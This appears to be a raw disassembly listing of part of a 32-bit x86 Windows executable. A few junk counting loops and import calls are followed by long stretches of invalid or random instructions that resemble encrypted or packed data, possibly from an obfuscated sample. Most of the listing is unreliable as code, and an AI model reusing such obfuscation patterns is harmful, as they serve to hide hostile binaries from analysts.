  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	rcr    DWORD PTR [ebp-0x44e5a837],0x42
  40f577:	js     0x40f5f1
  40f579:	in     eax,0x7e
  40f57b:	js     0x40f5f5
  40f57d:	mov    eax,ds:0x535468ab
  40f582:	int    0x47
  40f584:	scas   eax,DWORD PTR es:[edi]
  40f585:	idiv   BYTE PTR [edx-0x60]
  40f588:	and    DWORD PTR [ebp-0x20],0x6b
  40f58c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40f58e:	mov    esi,0x4188867a
  40f593:	mov    ebp,0x96356aaf
  40f598:	dec    ebx
  40f599:	out    0xca,eax
  40f59b:	pop    ds
  40f59c:	nop
  40f59d:	xchg   ecx,eax
  40f59e:	call   0x1d93:0xcb611c54
  40f5a5:	iret   
  40f5a6:	sbb    al,0x9c
  40f5a8:	or     BYTE PTR [esi],0x3f
  40f5ab:	in     al,dx
  40f5ac:	xor    BYTE PTR [ecx],dl
  40f5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5af:	aad    0xb
  40f5b1:	jmp    0xbcb4509c
  40f5b6:	pop    ss
  40f5b7:	cwde   
  40f5b8:	pop    edi
  40f5b9:	xchg   edx,eax
  40f5ba:	loope  0x40f62d
  40f5bc:	xor    al,0x83
  40f5be:	dec    edi
  40f5bf:	push   ecx
  40f5c0:	retf   
  40f5c1:	mov    ecx,0x6b388aa9
  40f5c6:	out    0x23,al
  40f5c8:	xchg   DWORD PTR [ecx-0x3964c1b6],edx
  40f5ce:	sbb    BYTE PTR [esi+0x7432c239],dh
  40f5d4:	push   ebp
  40f5d5:	sub    al,0x90
  40f5d7:	cwde   
  40f5d8:	fidiv  DWORD PTR [edi]
  40f5da:	cmc    
  40f5db:	jge    0x40f5fc
  40f5dd:	mov    ecx,0xa293e7a
  40f5e2:	jle    0x40f61b
  40f5e4:	ja     0x40f5df
  40f5e6:	imul   ecx,DWORD PTR [edi-0x591dfa46],0x29
  40f5ed:	in     al,0x38
  40f5ef:	mov    esi,0x15d7ece8
  40f5f4:	adc    al,0x85
  40f5f6:	sub    BYTE PTR [edx+0x1740a089],dh
  40f5fc:	ret    0xe9b6
  40f5ff:	cmp    esi,ebx
  40f601:	dec    esp
  40f602:	fcomp  QWORD PTR [edi+0x134d7a94]
  40f608:	xor    DWORD PTR [ebx-0xdee442c],ebx
  40f60e:	cli    
  40f60f:	shl    BYTE PTR [edi-0x782c3188],1
  40f615:	shr    DWORD PTR [eax-0x40],1
  40f618:	mov    esp,0x752c96b7
  40f61d:	mov    ds:0xaed08ba5,eax
  40f622:	out    0xe,eax
  40f624:	clc    
  40f625:	jmp    0x6138b788
  40f62a:	dec    ebp
  40f62b:	xchg   edx,eax
  40f62c:	pop    edi
  40f62d:	push   ecx
  40f62e:	jp     0x40f68a
  40f630:	push   esi
  40f631:	mov    dl,cl
  40f633:	push   0x4d
  40f635:	ins    DWORD PTR es:[edi],dx
  40f636:	adc    eax,0x22aaaf29
  40f63b:	add    al,0x44
  40f63d:	push   es
  40f63e:	pushf  
  40f63f:	cld    
  40f640:	out    0xb1,al
  40f642:	jecxz  0x40f674
  40f644:	shl    BYTE PTR [eax-0x44],0x25
  40f648:	pusha  
  40f649:	xor    ebx,DWORD PTR [edx+0x6eda5e47]
  40f64f:	ret    
  40f650:	push   0xf1506d2a
  40f655:	out    dx,al
  40f656:	xchg   ebx,eax
  40f657:	jnp    0x40f67c
  40f659:	push   0x5533d063
  40f65e:	ror    DWORD PTR [esi-0xc],1
  40f661:	sbb    BYTE PTR [edx+0x4a],0xb
  40f665:	push   ebx
  40f666:	add    eax,0xe1d1cce9
  40f66b:	jmp    0xec05e59d
  40f670:	pop    esi
  40f671:	ret    0x985
  40f674:	call   0x4594:0x4d9f8c0
  40f67b:	iret   
  40f67c:	and    dh,0xf6
  40f67f:	pop    edi
  40f680:	mov    ecx,0xdf47694f
  40f685:	es pusha 
  40f687:	popa   
  40f688:	or     BYTE PTR [edx-0x24823153],ch
  40f68e:	mov    dl,al
  40f690:	stc    
  40f691:	nop
  40f692:	lods   al,BYTE PTR ds:[esi]
  40f693:	add    al,0xc8
  40f695:	mov    ch,0x17
  40f697:	mov    ebx,0x4f96ca7f
  40f69c:	pop    edx
  40f69d:	sbb    al,0x33
  40f69f:	test   DWORD PTR [ecx+0x394506d6],esp
  40f6a5:	in     al,0xba
  40f6a7:	xor    cl,BYTE PTR [ecx]
  40f6a9:	xor    al,0x8d
  40f6ab:	or     ecx,DWORD PTR [eiz*1+0x7f7f33b1]
  40f6b2:	pop    edi
  40f6b3:	out    dx,eax
  40f6b4:	xchg   esi,eax
  40f6b5:	lock leave 
  40f6b7:	int3   
  40f6b8:	iret   
  40f6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6ba:	and    ebx,DWORD PTR [ebx]
  40f6bc:	sbb    al,0x15
  40f6be:	dec    eax
  40f6bf:	jle    0x40f6d4
  40f6c1:	sahf   
  40f6c2:	addr16 jl 0x40f675
  40f6c5:	dec    ecx
  40f6c6:	and    al,0xdd
  40f6c8:	cmp    BYTE PTR [esi],0x35
  40f6cb:	or     BYTE PTR [ecx+0x38],dl
  40f6ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6cf:	sbb    eax,0xacc8c1aa
  40f6d5:	into   
  40f6d6:	data16 scas al,BYTE PTR es:[edi]
  40f6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d9:	inc    edi
  40f6da:	mov    dl,0x56
  40f6dc:	jnp    0x40f742
  40f6de:	cs inc esi
  40f6e0:	arpl   WORD PTR [esi],bp
  40f6e2:	add    dh,BYTE PTR [ebx+0x68]
  40f6e5:	addr16 ja 0x40f712
  40f6e8:	repnz aam 0x6e
  40f6eb:	sub    al,0xf4
  40f6ed:	jmp    0xb921be49
  40f6f2:	xchg   edi,eax
  40f6f3:	inc    ebp
  40f6f4:	mov    ah,0x16
  40f6f6:	jns    0x40f75e
  40f6f8:	cmc    
  40f6f9:	mov    WORD PTR [ebp+ebx*1+0x50],?
  40f6fd:	mov    ah,0x69
  40f6ff:	cmp    bh,BYTE PTR [edi-0x53768d0]
  40f705:	xor    eax,0x63ca46b2
  40f70a:	je     0x40f75f
  40f70c:	or     ebp,DWORD PTR [edx+esi*8+0x2f597357]
  40f713:	push   esp
  40f714:	ror    edi,1
  40f716:	inc    esp
  40f717:	xchg   BYTE PTR [edx],ch
  40f719:	scas   al,BYTE PTR es:[edi]
  40f71a:	mov    ch,0x13
  40f71c:	adc    BYTE PTR [esi+0x2c],al
  40f71f:	adc    DWORD PTR [esi+0x58],edx
  40f722:	mov    ebx,0xf09a3f54
  40f727:	xor    eax,0xd922d89c
  40f72c:	(bad)  ds:0x4305ab58
  40f732:	stos   WORD PTR es:[edi],ax
  40f734:	xor    DWORD PTR [esi-0x7c],0xc808c687
  40f73b:	je     0x40f743
  40f73d:	daa    
  40f73e:	aam    0x24
  40f740:	and    BYTE PTR ds:0x81979428,bh
  40f746:	mov    cl,0xad
  40f748:	in     eax,0x13
  40f74a:	aaa    
  40f74b:	sbb    esp,ebp
  40f74d:	mov    DWORD PTR [ebx],edi
  40f74f:	push   esi
  40f750:	pop    eax
  40f751:	push   eax
  40f752:	cmc    
  40f753:	inc    ecx
  40f754:	mov    ds:0x3e378d4b,al
  40f759:	test   al,0xf9
  40f75b:	sub    ecx,DWORD PTR [edi+0x4b816ca5]
  40f761:	dec    eax
  40f762:	mov    bl,0x4f
  40f764:	sub    eax,0x9b57d712
  40f769:	aad    0xbd
  40f76b:	nop
  40f76c:	call   0xa4615186
  40f771:	mov    ds:0x2de1e195,al
  40f776:	inc    ebp
  40f777:	mov    WORD PTR [edi+0x3b669dca],?
  40f77d:	jo     0x40f714
  40f77f:	cmc    
  40f780:	mov    edx,0xc3b14612
  40f785:	add    eax,0xc4e6be9a
  40f78a:	or     cl,bl
  40f78c:	and    eax,0x906a130d
  40f791:	enter  0xea18,0x96
  40f795:	jecxz  0x40f7db
  40f797:	sahf   
  40f798:	mov    al,ds:0x931f990a
  40f79d:	inc    ebx
  40f79e:	daa    
  40f79f:	push   0x56823128
  40f7a4:	and    eax,0xd5e06bb9
  40f7a9:	inc    ecx
  40f7aa:	sub    bl,BYTE PTR [eax]
  40f7ac:	adc    dh,BYTE PTR [edi+ebp*8+0x39]
  40f7b0:	inc    ebp
  40f7b1:	mov    edx,0x904db885
  40f7b6:	jno    0x40f82a
  40f7b8:	pushf  
  40f7b9:	lea    edx,[ecx+edi*1]
  40f7bc:	dec    edi
  40f7bd:	fiadd  WORD PTR [ecx+0x72]
  40f7c0:	push   0x79
  40f7c2:	pusha  
  40f7c3:	(bad)
  40f7c6:	add    ebx,DWORD PTR [esp+ebp*4]
  40f7c9:	inc    esp
  40f7ca:	sbb    BYTE PTR [eax+0x28],bh
  40f7cd:	sub    eax,0xc9317e
  40f7d2:	or     dh,dl
  40f7d4:	or     al,ah
  40f7d6:	mov    dl,0xd2
  40f7d8:	add    ebp,DWORD PTR [ecx+ecx*4+0x44]
  40f7dc:	adc    ah,bl
  40f7de:	add    edi,DWORD PTR [ebp+0x35]
  40f7e1:	jbe    0x40f7af
  40f7e3:	les    ecx,FWORD PTR [ebp+0x35]
  40f7e6:	cld    
  40f7e7:	mov    esp,0xfa3bd103
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0x5211c75f,ch
  40f80a:	mov    ah,0x20
  40f80c:	inc    edi
  40f80d:	js     0x40f887
  40f80f:	in     eax,0x7e
  40f811:	js     0x40f88b
  40f813:	jecxz  0x40f806
  40f815:	mov    al,0x27
  40f817:	loop   0x40f7fc
  40f819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f81a:	(bad)  
  40f81c:	mov    bl,0x77
  40f81e:	fsub   QWORD PTR [esi+eax*1+0x6f]
  40f822:	dec    ebx
  40f823:	jmp    0x1818:0x7ede2f09
  40f82a:	das    
  40f82b:	xchg   edx,eax
  40f82c:	scas   al,BYTE PTR es:[edi]
  40f82d:	ficomp WORD PTR [ebp+0x72fa8988]
  40f833:	push   cs
  40f834:	in     al,dx
  40f835:	cmp    BYTE PTR [edi],dh
  40f837:	dec    sp
  40f839:	rcr    BYTE PTR [eax],cl
  40f83b:	outs   dx,WORD PTR ds:[esi]
  40f83d:	and    DWORD PTR [ebp-0x54519983],eax
  40f843:	fidiv  DWORD PTR [ebp-0x6]
  40f846:	(bad)  
  40f847:	call   0xa451:0x81c08cb9
  40f84e:	pusha  
  40f84f:	retf   0xb3d5
  40f852:	xchg   ebx,eax
  40f853:	jmp    0x40f84b
  40f855:	test   al,0x57
  40f857:	push   ebx
  40f858:	fnstcw WORD PTR [edx-0x649e9267]
  40f85e:	int    0x7
  40f860:	ins    DWORD PTR es:[edi],dx
  40f861:	xchg   BYTE PTR [ebp+0x4f4ed06d],al
  40f867:	addr16 aam 0x78
  40f86a:	cli    
  40f86b:	cmp    eax,0xd6e81eab
  40f870:	aaa    
  40f871:	shl    DWORD PTR [eax],0x18
  40f874:	test   DWORD PTR [edi+0x49cdda0c],eax
  40f87a:	push   esp
  40f87b:	into   
  40f87c:	mov    eax,0x5acc85ec
  40f881:	rcr    DWORD PTR [ebx-0x1f],cl
  40f884:	arpl   sp,si
  40f886:	adc    DWORD PTR [esi-0x72],ebp
  40f889:	sbb    DWORD PTR [eax+eax*1+0x66ac753b],esi
  40f890:	jbe    0x40f884
  40f892:	loope  0x40f85e
  40f894:	inc    esi
  40f895:	xor    eax,0x6f964cee
  40f89a:	into   
  40f89b:	fs das 
  40f89d:	push   esp
  40f89e:	scas   al,BYTE PTR es:[edi]
  40f89f:	pushf  
  40f8a0:	jno    0x40f914
  40f8a2:	mov    ds,WORD PTR [eax+0x1c9811f2]
  40f8a8:	dec    edi
  40f8a9:	adc    al,0x58
  40f8ab:	jnp    0x40f928
  40f8ad:	cmp    dh,BYTE PTR [ecx+ebx*1+0x37dfba5d]
  40f8b4:	mov    ecx,0x47652987
  40f8b9:	fld    TBYTE PTR [ebp+ebx*1-0x420cbad6]
  40f8c0:	push   es
  40f8c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8c2:	adc    al,0x70
  40f8c5:	push   cs
  40f8c6:	mov    cs:0x6a3fcaa1,eax
  40f8cc:	push   edx
  40f8cd:	mov    dh,0xe8
  40f8cf:	repz xchg ebp,eax
  40f8d1:	mov    edi,0x92661500
  40f8d6:	and    BYTE PTR [ebx+0x6f496f36],ah
  40f8dc:	pop    ecx
  40f8dd:	into   
  40f8de:	pop    edi
  40f8df:	in     al,0x33
  40f8e1:	pop    esi
  40f8e2:	lea    eax,[edx+0x7f]
  40f8e5:	xchg   edx,eax
  40f8e6:	cwde   
  40f8e7:	shl    DWORD PTR [ebx],cl
  40f8e9:	adc    DWORD PTR [eax],esi
  40f8eb:	add    cl,dl
  40f8ed:	aas    
  40f8ee:	pop    DWORD PTR [edi-0x5d]
  40f8f1:	jp     0x40f8a3
  40f8f3:	mov    ds:0xff85baf1,eax
  40f8f8:	mov    ebp,ebp
  40f8fa:	cmp    eax,0xa49f6127
  40f8ff:	mov    eax,ds:0x7ebad92d
  40f904:	loop   0x40f8e7
  40f906:	jecxz  0x40f8fe
  40f908:	out    0x53,eax
  40f90a:	shl    BYTE PTR [edi],0xe3
  40f90d:	lods   eax,DWORD PTR fs:[esi]
  40f90f:	arpl   WORD PTR [esi+0x25d276a3],di
  40f915:	dec    esi
  40f916:	cwde   
  40f917:	xchg   edi,eax
  40f918:	ins    BYTE PTR es:[edi],dx
  40f919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f91a:	mov    dl,0xa0
  40f91c:	imul   eax,DWORD PTR [edx-0x6c],0xfffffffc
  40f920:	inc    BYTE PTR [eax+ebx*4-0x1c10ce5c]
  40f927:	pop    ss
  40f928:	mov    esp,0x782c3f7b
  40f92d:	int    0xe6
  40f92f:	or     bl,cl
  40f931:	es xchg dl,cl
  40f934:	popa   
  40f935:	in     al,0x9c
  40f937:	dec    eax
  40f938:	fsub   DWORD PTR [ebp-0x4683087e]
  40f93e:	pop    ds
  40f93f:	or     eax,0x12cec3d0
  40f944:	sahf   
  40f945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f946:	xor    BYTE PTR ds:0x6a4e72e0,0x65
  40f94d:	mov    esp,0x59dce32f
  40f952:	loop   0x40f91e
  40f954:	fadd   QWORD PTR es:[edi+ebp*2+0x36dce0c2]
  40f95c:	test   al,0x3e
  40f95e:	ins    BYTE PTR es:[edi],dx
  40f95f:	aad    0xb7
  40f961:	dec    ebx
  40f962:	inc    ebp
  40f963:	xor    esp,DWORD PTR [edx+0x60ebe145]
  40f969:	jnp    0x40f9d7
  40f96b:	or     DWORD PTR [ecx+0x46],ebp
  40f96e:	jae    0x40f9ef
  40f970:	and    bh,BYTE PTR [ebx+0x51a1394c]
  40f976:	mov    ds:0xf6adc4fb,al
  40f97b:	cmp    DWORD PTR [esi+ecx*4],esi
  40f97e:	lahf   
  40f97f:	mov    ecx,0xf962b7e7
  40f984:	into   
  40f985:	mov    ebx,0xee77dc39
  40f98a:	push   es
  40f98b:	mov    bh,0x30
  40f98d:	mov    fs,WORD PTR [esi]
  40f98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f990:	sti    
  40f991:	fiadd  WORD PTR [esi]
  40f993:	push   ebp
  40f994:	and    ebx,DWORD PTR [ebp-0x288239bc]
  40f99a:	imul   DWORD PTR [ebp+0x58]
  40f99d:	loop   0x40f97d
  40f99f:	ins    BYTE PTR es:[edi],dx
  40f9a0:	js     0x40f990
  40f9a2:	cmp    DWORD PTR [edx-0x7412d981],0x7c7e0587
  40f9ac:	adc    bh,BYTE PTR [edi+0x58]
  40f9af:	lods   al,BYTE PTR ds:[esi]
  40f9b0:	int    0xd4
  40f9b2:	repz adc DWORD PTR [edi-0x26],ecx
  40f9b6:	cli    
  40f9b7:	fucomip st,st(3)
  40f9b9:	(bad)  
  40f9bb:	ins    DWORD PTR es:[edi],dx
  40f9bc:	xor    BYTE PTR [esi+eiz*2+0x55],0xf7
  40f9c1:	addr16 adc ecx,ebx
  40f9c4:	fwait
  40f9c5:	jp     0x40f9f8
  40f9c7:	in     eax,dx
  40f9c8:	mov    ebp,0x208ce17b
  40f9cd:	or     BYTE PTR [ebp+0x28],ah
  40f9d0:	imul   edx,DWORD PTR [ebp-0x55],0xffffffd4
  40f9d4:	mov    ss,edx
  40f9d6:	leave  
  40f9d7:	mov    eax,cs
  40f9d9:	push   edi
  40f9da:	push   0x62f9eddb
  40f9df:	popa   
  40f9e0:	mov    WORD PTR [edi-0x2f],ss
  40f9e3:	loope  0x40fa3d
  40f9e5:	dec    edx
  40f9e6:	scas   eax,DWORD PTR es:[edi]
  40f9e7:	leave  
  40f9e8:	sub    ch,bl
  40f9ea:	xchg   esp,eax
  40f9eb:	cmp    al,0xb6
  40f9ed:	xchg   ecx,eax
  40f9ee:	add    al,0x7d
  40f9f0:	and    ch,BYTE PTR [esi+0x20a12358]
  40f9f6:	sbb    al,0x9
  40f9f8:	dec    eax
  40f9f9:	and    eax,0x11e03c5d
  40f9fe:	(bad)  
  40fa00:	push   ebx
  40fa01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa02:	push   0x44c0c2bc
  40fa07:	sub    edi,DWORD PTR [esi-0x373dca86]
  40fa0d:	je     0x40fa57
  40fa0f:	mov    ch,0xcc
  40fa11:	sub    dh,BYTE PTR [edi-0x12]
  40fa14:	test   BYTE PTR [edi-0x1a1fa0b2],0xa8
  40fa1b:	int    0xc2
  40fa1d:	cmp    dl,BYTE PTR [edx+edi*2]
  40fa20:	in     al,dx
  40fa21:	sbb    dh,BYTE PTR [edx+0x19768607]
  40fa27:	push   ecx
  40fa28:	loopne 0x40fa33
  40fa2a:	jle    0x40fa76
  40fa2c:	and    al,0xe7
  40fa2e:	sbb    al,0x64
  40fa30:	lea    ebx,[eax+ecx*8-0x12]
  40fa34:	or     eax,0xb61e78b6
  40fa39:	ss popf 
  40fa3b:	mov    bh,0x8f
  40fa3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa3e:	imul   ecx,edx,0x26cb021
  40fa44:	fnstsw WORD PTR [ecx+0x2faa9c02]
  40fa4a:	frstor [eax+0x1c949970]
  40fa50:	sbb    BYTE PTR [edx-0x6],cl
  40fa53:	and    eax,0x26184302
  40fa58:	mov    ds:0x27b8b4,eax
  40fa5d:	pusha  
  40fa5e:	xor    ah,bh
  40fa60:	or     al,0xc0
  40fa62:	enter  0x3600,0xba
  40fa66:	push   cs
  40fa67:	pop    eax
  40fa68:	(bad)  
  40fa6a:	inc    ebp
  40fa6b:	les    ebx,FWORD PTR [ebx]
  40fa6d:	test   BYTE PTR [esi-0x563b6349],bh
  40fa73:	sbb    al,BYTE PTR [edx+0x4174e2c8]
  40fa79:	mov    es,WORD PTR [ecx+0xf161fb1]
  40fa7f:	test   BYTE PTR [ebx+0x53000053],ch
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb6e
  40fb0f:	lods   al,BYTE PTR ds:[esi]
  40fb10:	rcl    BYTE PTR [ecx-0x73],1
  40fb13:	inc    ebp
  40fb14:	js     0x40fb8e
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	das    
  40fb1b:	int3   
  40fb1c:	loop   0x40fb68
  40fb1e:	fidiv  WORD PTR [eax-0x1bbb1325]
  40fb24:	xchg   BYTE PTR [esi],ch
  40fb26:	jle    0x40fb0c
  40fb28:	inc    esp
  40fb29:	mov    eax,ds:0xf60b6f99
  40fb2e:	cmp    DWORD PTR [esi],ebp
  40fb30:	imul   eax,DWORD PTR [ebx+0x65],0x68
  40fb34:	xlat   BYTE PTR ds:[ebx]
  40fb35:	cmc    
  40fb36:	sbb    eax,0x46cdda4a
  40fb3b:	mov    bh,0xb5
  40fb3d:	shr    DWORD PTR ds:0x9ac7a597,cl
  40fb43:	cmp    DWORD PTR [eax+0x25],eax
  40fb46:	inc    eax
  40fb47:	push   ss
  40fb48:	(bad)  
  40fb49:	out    0x4e,al
  40fb4b:	push   ebx
  40fb4c:	mov    al,0x9
  40fb4e:	lods   al,BYTE PTR ds:[esi]
  40fb4f:	cmp    al,0x50
  40fb51:	jns    0x40fba4
  40fb53:	(bad)  [edi]
  40fb55:	push   ebx
  40fb56:	xchg   ecx,eax
  40fb57:	out    0xf7,al
  40fb59:	dec    ecx
  40fb5a:	lahf   
  40fb5b:	jmp    0x40fb0b
  40fb5d:	neg    DWORD PTR [eax]
  40fb5f:	push   ecx
  40fb60:	popf   
  40fb61:	or     eax,0xc549737
  40fb66:	inc    edi
  40fb67:	lods   al,BYTE PTR ds:[esi]
  40fb68:	imul   ecx,DWORD PTR [ecx],0xbbe7c475
  40fb6e:	out    0x2d,al
  40fb70:	and    bl,BYTE PTR [eax+0x74]
  40fb73:	adc    eax,0x4b5f6e17
  40fb78:	mov    dl,0x79
  40fb7a:	add    esi,esi
  40fb7c:	adc    ah,BYTE PTR [edx+0x537d9425]
  40fb82:	adc    dl,bh
  40fb84:	mov    ds:0x23b577f8,al
  40fb89:	cmp    DWORD PTR [ebx-0x5bd09fe5],0x144e10ea
  40fb93:	mov    DWORD PTR [eax],ebp
  40fb95:	push   esi
  40fb96:	ds call 0x4118:0x919268c5
  40fb9e:	fcomp  QWORD PTR [ebx+0x3cb826a7]
  40fba4:	xor    dh,BYTE PTR [edx]
  40fba6:	lahf   
  40fba7:	out    dx,al
  40fba8:	sbb    al,0x49
  40fbaa:	sbb    bh,BYTE PTR [eax]
  40fbac:	mov    al,ds:0xbd51b17f
  40fbb1:	cld    
  40fbb2:	mov    ch,0xdd
  40fbb4:	lea    edi,[edx+ecx*4+0x12fcdb94]
  40fbbb:	sub    ebx,ebx
  40fbbd:	pop    ds
  40fbbe:	leave  
  40fbbf:	sub    al,0xc8
  40fbc1:	and    edi,0x12
  40fbc4:	cli    
  40fbc5:	addr16 xchg edi,eax
  40fbc7:	iret   
  40fbc8:	xchg   edx,eax
  40fbc9:	repz out 0x3a,eax
  40fbcc:	pop    ss
  40fbcd:	jo     0x40fc49
  40fbcf:	aad    0xe4
  40fbd1:	out    dx,eax
  40fbd2:	nop
  40fbd3:	xchg   ecx,eax
  40fbd4:	aam    0x46
  40fbd6:	out    dx,al
  40fbd7:	fisub  DWORD PTR [edx-0x5cbc611c]
  40fbdd:	popa   
  40fbde:	push   ss
  40fbdf:	push   ecx
  40fbe0:	fs sti 
  40fbe2:	les    ecx,FWORD PTR [edx-0x66]
  40fbe5:	arpl   di,di
  40fbe7:	jmp    0x7fd6:0xedb6744b
  40fbee:	cmp    edx,ecx
  40fbf0:	fwait
  40fbf1:	dec    ecx
  40fbf2:	push   edi
  40fbf3:	inc    ecx
  40fbf4:	push   ds
  40fbf5:	stos   BYTE PTR es:[edi],al
  40fbf6:	mov    ebx,0x1d24a529
  40fbfb:	loop   0x40fc70
  40fbfd:	adc    ch,BYTE PTR [edi]
  40fbff:	jno    0x40fc4d
  40fc01:	cs xchg ecx,eax
  40fc03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc04:	rcr    BYTE PTR [ebx+0x5fb2887],1
  40fc0a:	dec    esp
  40fc0b:	mov    eax,0x7f78bf18
  40fc10:	sbb    al,0x79
  40fc12:	add    DWORD PTR [eax],eax
  40fc14:	mov    bl,0x5a
  40fc16:	and    ecx,DWORD PTR [esi+0x345d0713]
  40fc1c:	cwde   
  40fc1d:	fcom   QWORD PTR es:0x350dcf2a
  40fc24:	xchg   DWORD PTR [edi+eax*1-0x14],ecx
  40fc28:	add    al,0x56
  40fc2a:	jle    0x40fc92
  40fc2c:	mov    al,0xba
  40fc2e:	mov    cl,0x58
  40fc30:	mov    ebx,0x31e7f209
  40fc35:	pushf  
  40fc36:	bound  eax,QWORD PTR [eax-0x3344667c]
  40fc3c:	push   0x42
  40fc3e:	jbe    0x40fbfe
  40fc40:	jae    0x40fbf6
  40fc42:	pop    ebp
  40fc43:	ins    BYTE PTR es:[edi],dx
  40fc44:	jmp    0x40fc6e
  40fc46:	mov    WORD PTR [ebp-0x69],cs
  40fc49:	push   edi
  40fc4a:	pop    es
  40fc4b:	retf   0x6493
  40fc4e:	inc    ebx
  40fc4f:	ins    DWORD PTR es:[edi],dx
  40fc50:	or     ecx,DWORD PTR [ecx-0x43]
  40fc53:	jno    0x40fc67
  40fc55:	pushf  
  40fc56:	adc    ebp,ebp
  40fc58:	daa    
  40fc59:	mov    ecx,0x7245a62e
  40fc5e:	pushf  
  40fc5f:	mov    ah,BYTE PTR [ebp-0x54104edb]
  40fc65:	cmp    ah,bl
  40fc67:	sbb    al,0x66
  40fc69:	push   edx
  40fc6a:	in     eax,0xdc
  40fc6c:	jmp    DWORD PTR [eax+0x6d66df4a]
  40fc72:	or     dh,BYTE PTR [esi]
  40fc74:	jns    0x40fc4b
  40fc76:	inc    edi
  40fc77:	test   eax,0x95872a0b
  40fc7c:	push   ss
  40fc7d:	js     0x40fc3f
  40fc7f:	mov    dh,dh
  40fc81:	mov    ds:0xf876843e,al
  40fc86:	mov    bh,0x85
  40fc88:	popf   
  40fc89:	dec    edi
  40fc8a:	adc    al,0x12
  40fc8c:	in     eax,0x5d
  40fc8e:	loope  0x40fc8e
  40fc90:	shl    BYTE PTR [edx-0x2d10c7ad],0x6d
  40fc97:	pop    edx
  40fc98:	xor    eax,0xc4d9219b
  40fc9d:	sbb    eax,0x9c3dc6f1
  40fca2:	push   ebp
  40fca3:	pop    esp
  40fca4:	test   DWORD PTR [esi],ebx
  40fca6:	ss pop ss
  40fca8:	xor    al,BYTE PTR [ecx-0xa]
  40fcab:	test   DWORD PTR [edi-0x6ea7bd7],esp
  40fcb1:	fisttp WORD PTR [ecx-0xee91bff]
  40fcb7:	pop    es
  40fcb8:	ret    0x1f57
  40fcbb:	in     al,dx
  40fcbc:	sbb    DWORD PTR [eax-0x3d],ecx
  40fcbf:	sub    al,0xdb
  40fcc1:	out    dx,al
  40fcc2:	es mov sp,0x7f18
  40fcc7:	test   eax,ebx
  40fcc9:	xchg   BYTE PTR [esi],dh
  40fccb:	dec    esi
  40fccc:	adc    edi,DWORD PTR [ebx+0x50abc00a]
  40fcd2:	std    
  40fcd3:	cmc    
  40fcd4:	leave  
  40fcd5:	cmp    cl,BYTE PTR [ebx+0x24]
  40fcd8:	jmp    0xc2a767b3
  40fcdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcde:	(bad)  
  40fcdf:	fs or  ch,cl
  40fce2:	int    0x4d
  40fce4:	loop   0x40fcc8
  40fce6:	mov    eax,0xe5f9b5c3
  40fceb:	dec    ebx
  40fcec:	sub    bl,BYTE PTR [edx+0x33569138]
  40fcf2:	push   0xffffffc6
  40fcf4:	addr16 adc eax,0x3884ee3e
